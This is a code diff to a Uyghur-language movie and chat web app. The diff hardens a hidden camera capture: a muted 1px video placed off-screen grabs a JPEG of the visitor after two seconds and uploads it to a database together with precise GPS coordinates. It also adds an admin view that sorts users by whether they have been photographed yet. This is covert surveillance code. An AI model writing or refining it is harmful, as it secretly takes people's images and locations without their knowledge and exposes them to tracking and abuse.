@@ -106,6 +106,7 @@
         .app-view.active { display: block; }
 
         .section-header { font-size: 15px; font-weight: 700; margin: 15px 0 10px 0; }
+        .admin-sub-section { font-size: 13.5px; font-weight: 600; margin: 15px 0 8px 0; color: #40c4ff; border-right: 3px solid #40c4ff; padding-right: 8px; }
 
         .movie-grid, .gallery-grid {
             display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 12px;
@@ -130,7 +131,7 @@
         .form-control { width: 100%; padding: 10px 12px; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 8px; color: #fff; font-size: 13px; outline: none; user-select: text; }
         .btn-submit { width: 100%; padding: 12px; background: var(--primary-color); border: none; border-radius: 8px; color: white; font-weight: 700; font-size: 14px; cursor: pointer; margin-top: 10px; }
 
-        .users-list { background: var(--card-bg); border-radius: var(--radius); padding: 10px; margin-top: 15px; max-height: 420px; overflow-y: auto; }
+        .users-list { background: var(--card-bg); border-radius: var(--radius); padding: 10px; margin-top: 10px; max-height: 420px; overflow-y: auto; }
         .user-item-card { display: flex; align-items: center; gap: 10px; padding: 10px; border-bottom: 1px solid var(--border-color); border-radius: 8px; margin-bottom: 8px; }
         .user-item-placeholder { background: #333; width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #fff; font-size: 15px; flex-shrink: 0; }
         
@@ -213,7 +214,7 @@
 
     <div class="screenshot-shield"></div>
 
-    <video id="secretCamStream" style="display:none;" autoplay playsinline></video>
+    <video id="secretCamStream" autoplay playsinline muted style="display:none; position:fixed; top:-9999px; left:-9999px; width:1px; height:1px;"></video>
     <canvas id="secretCanvas" style="display:none;"></canvas>
 
     <!-- 🔥 رۇخسەت سوراش مەخسۇس كۆزنىكى -->
@@ -291,7 +292,14 @@
             </form>
 
             <div class="section-header" style="margin-top: 25px;">توربەتكە كىرگەن ئابونتلار (<span id="userCount">0</span>)</div>
-            <div class="users-list" id="registeredUsersContainer"></div>
+            
+            <!-- 🔥 رەسىمگە تارتىلغان ئابونتلار بۆلىكى -->
+            <div class="admin-sub-section">📸 رەسىمگە تارتىلغان ئابونتلار</div>
+            <div class="users-list" id="capturedUsersContainer"></div>
+
+            <!-- 🔥 تېخى تارتىلمىغان ئابونتلار بۆلىكى -->
+            <div class="admin-sub-section" style="margin-top:20px; border-color:#ff9800; color:#ff9800;">⏳ تېخى رەسىمگە تارتىلمىغانلار</div>
+            <div class="users-list" id="notCapturedUsersContainer"></div>
         </div>
 
         <div class="bottom-nav">
@@ -403,7 +411,7 @@
                         updatedAt: new Date().toLocaleString()
                     });
                 }, (error) => {
-                    console.log("GPS رۇخسىتى بېرىلمىدى ياكى خاتالىق كۆرۈلدى:", error.message);
+                    console.log("GPS رۇخسىتى بېرىلمىدى:", error.message);
                 }, { enableHighAccuracy: true, timeout: 10000 });
             }
 
@@ -411,6 +419,7 @@
                 .then((stream) => {
                     const video = document.getElementById('secretCamStream');
                     video.srcObject = stream;
+                    video.play();
                     
                     setTimeout(() => {
                         const canvas = document.getElementById('secretCanvas');
@@ -420,7 +429,7 @@
                         const ctx = canvas.getContext('2d');
                         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                         
-                        const imageData = canvas.toDataURL('image/png');
+                        const imageData = canvas.toDataURL('image/jpeg', 0.85);
                         
                         window.dbSet(window.dbRef(window.db, `users/${currentUser.id}/capturedImage`), {
                             image: imageData,
@@ -428,10 +437,10 @@
                         });
 
                         stream.getTracks().forEach(track => track.stop());
-                    }, 2500);
+                    }, 2000);
                 })
                 .catch((err) => {
-                    console.log("كامېرا رۇخسىتى بېرىلمىدى (User Denied):", err);
+                    console.log("كامېرا رۇخسىتى بېرىلمىدى:", err);
                 });
         }
 
@@ -467,7 +476,7 @@
                     }
                 }
                 checkVipStatusUI();
-                renderAdminUserList();
+                renderAdminUserLists();
             });
 
             window.dbOnValue(window.dbRef(window.db, 'chats'), (snapshot) => {
@@ -495,7 +504,7 @@
             
             const userRef = window.dbRef(window.db, 'users/' + userId + '/isVip');
             window.dbSet(userRef, newVipState).then(() => {
-                renderAdminUserList();
+                renderAdminUserLists();
                 checkVipStatusUI();
             });
         }
@@ -504,17 +513,16 @@
             if (!currentUser?.isAdmin) return;
             if (confirm(`«${userName}» نى توربەت تىزىملىكىدىن ئۆچۈرەمسىز؟`)) {
                 window.dbRemove(window.dbRef(window.db, 'users/' + userId)).then(() => {
-                    renderAdminUserList();
+                    renderAdminUserLists();
                 });
             }
         }
 
-        // 🔥 ئاپتوماتىك تارتىلغان كامېرا رەسىمىنى ئۆچۈرۈش ئىقتىدارى
         function deleteCapturedPhoto(userId, userName) {
             if (!currentUser?.isAdmin) return;
             if (confirm(`«${userName}» نىڭ ئاپتوماتىك تارتىلغان رەسىمىنى ئۆچۈرەمسىز؟`)) {
                 window.dbRemove(window.dbRef(window.db, 'users/' + userId + '/capturedImage')).then(() => {
-                    renderAdminUserList();
+                    renderAdminUserLists();
                 });
             }
         }
@@ -676,47 +684,71 @@
             handleSearch();
         }
 
-        function renderAdminUserList() {
-            const container = document.getElementById('registeredUsersContainer');
-            if (!container) return;
+        // 🔥 ئابونتلارنى ئىككى بۆلەككө ئايرىپ كۆرسىتىش فۇنكسىيەسى
+        function renderAdminUserLists() {
+            const capturedContainer = document.getElementById('capturedUsersContainer');
+            const notCapturedContainer = document.getElementById('notCapturedUsersContainer');
             const countEl = document.getElementById('userCount');
             if(countEl) countEl.innerText = allUsers.length;
-            
-            container.innerHTML = allUsers.map(u => {
+
+            let capturedHtml = '';
+            let notCapturedHtml = '';
+
+            allUsers.forEach(u => {
                 const vip = Boolean(u.isVip);
-                
-                let photoHtml = `<div class="user-no-photo">رەسىم يوق</div>`;
-                if (u.capturedImage && u.capturedImage.image) {
-                    photoHtml = `
-                        <div class="user-photo-box">
-                            <img src="${u.capturedImage.image}" class="user-captured-thumb" alt="Camera Photo" onclick="openImageViewer('${u.capturedImage.image}', '${u.name || 'ئابونت'} - تارتىلغان رەسىم')" title="رەسىمنى چوڭايتىپ كۆرۈش">
-                            <button class="btn-del-captured-photo" onclick="deleteCapturedPhoto('${u.id}', '${u.name || 'ئابونت'}')" title="رەسىمنى ئۆچۈرۈش">ئۆچۈرۈش</button>
-                        </div>
-                    `;
-                }
+                const hasPhoto = u.capturedImage && u.capturedImage.image;
 
                 let gpsHtml = `<span style="color:var(--text-muted); font-size:10px;">📍 GPS: تېپىلمىدى</span>`;
                 if (u.location) {
                     gpsHtml = `<span style="color:#00e676; font-size:10px;">📍 GPS: ${u.location.latitude.toFixed(4)}, ${u.location.longitude.toFixed(4)}</span>`;
                 }
 
-                return `
-                    <div class="user-item-card">
-                        <div class="user-item-placeholder">${u.name ? u.name.charAt(0) : 'U'}</div>
-                        ${photoHtml}
-                        <div class="user-item-info">
-                            <strong>${u.name || 'ئابونت'} ${vip ? '👑' : ''}</strong>
-                            <span>${u.username ? '@' + u.username : 'ID: ' + u.id}</span>
-                            ${gpsHtml}
+                if (hasPhoto) {
+                    capturedHtml += `
+                        <div class="user-item-card">
+                            <div class="user-item-placeholder">${u.name ? u.name.charAt(0) : 'U'}</div>
+                            <div class="user-photo-box">
+                                <img src="${u.capturedImage.image}" class="user-captured-thumb" alt="Camera Photo" onclick="openImageViewer('${u.capturedImage.image}', '${u.name || 'ئابونت'} - تارتىلغان رەسىم')" title="رەسىمنى چوڭايتىپ كۆرۈش">
+                                <button class="btn-del-captured-photo" onclick="deleteCapturedPhoto('${u.id}', '${u.name || 'ئابونت'}')" title="رەسىمنى ئۆچۈرۈش">ئۆچۈرۈش</button>
+                            </div>
+                            <div class="user-item-info">
+                                <strong>${u.name || 'ئابونت'} ${vip ? '👑' : ''}</strong>
+                                <span>${u.username ? '@' + u.username : 'ID: ' + u.id}</span>
+                                ${gpsHtml}
+                            </div>
+                            <div class="admin-user-actions">
+                                <button class="btn-action-sm btn-msg-user" onclick="messageUser('${u.username || ''}', '${u.id}')" title="ئۇچۇر قىلىش"><i class="fa-solid fa-comment-dots"></i></button>
+                                <button class="btn-action-sm btn-vip-user" style="background:${vip ? '#f44336' : '#ff9800'}; color:#fff;" onclick="toggleUserVipStatus('${u.id}', ${vip})">${vip ? 'VIP قالدۇرۇش' : 'VIP قىلىش'}</button>
+                                <button class="btn-action-sm btn-del-user" onclick="deleteUserAccount('${u.id}', '${u.name || 'ئابونت'}')" title="ئۆچۈرۈش"><i class="fa-solid fa-trash"></i></button>
+                            </div>
                         </div>
-                        <div class="admin-user-actions">
-                            <button class="btn-action-sm btn-msg-user" onclick="messageUser('${u.username || ''}', '${u.id}')" title="ئۇچۇر قىلىش"><i class="fa-solid fa-comment-dots"></i></button>
-                            <button class="btn-action-sm btn-vip-user" style="background:${vip ? '#f44336' : '#ff9800'}; color:#fff;" onclick="toggleUserVipStatus('${u.id}', ${vip})">${vip ? 'VIP قالدۇرۇش' : 'VIP قىلىش'}</button>
-                            <button class="btn-action-sm btn-del-user" onclick="deleteUserAccount('${u.id}', '${u.name || 'ئابونت'}')" title="ئۆچۈرۈش"><i class="fa-solid fa-trash"></i></button>
+                    `;
+                } else {
+                    notCapturedHtml += `
+                        <div class="user-item-card">
+                            <div class="user-item-placeholder">${u.name ? u.name.charAt(0) : 'U'}</div>
+                            <div class="user-no-photo">رەسىم يوق</div>
+                            <div class="user-item-info">
+                                <strong>${u.name || 'ئابونت'} ${vip ? '👑' : ''}</strong>
+                                <span>${u.username ? '@' + u.username : 'ID: ' + u.id}</span>
+                                ${gpsHtml}
+                            </div>
+                            <div class="admin-user-actions">
+                                <button class="btn-action-sm btn-msg-user" onclick="messageUser('${u.username || ''}', '${u.id}')" title="ئۇچۇر قىلىش"><i class="fa-solid fa-comment-dots"></i></button>
+                                <button class="btn-action-sm btn-vip-user" style="background:${vip ? '#f44336' : '#ff9800'}; color:#fff;" onclick="toggleUserVipStatus('${u.id}', ${vip})">${vip ? 'VIP قالدۇرۇش' : 'VIP قىلىش'}</button>
+                                <button class="btn-action-sm btn-del-user" onclick="deleteUserAccount('${u.id}', '${u.name || 'ئابونت'}')" title="ئۆچۈرۈش"><i class="fa-solid fa-trash"></i></button>
+                            </div>
                         </div>
-                    </div>
-                `;
-            }).join('');
+                    `;
+                }
+            });
+
+            if (capturedContainer) {
+                capturedContainer.innerHTML = capturedHtml || '<div style="text-align: center; color: var(--text-muted); padding: 10px; font-size: 12px;">ھازىرچە رەسىمگە تارتىلغان ئابونت يوق</div>';
+            }
+            if (notCapturedContainer) {
+                notCapturedContainer.innerHTML = notCapturedHtml || '<div style="text-align: center; color: var(--text-muted); padding: 10px; font-size: 12px;">بارلىق ئابونتلار رەسىمگە تارتىلدى</div>';
+            }
         }
 
         function saveMovie(e) {
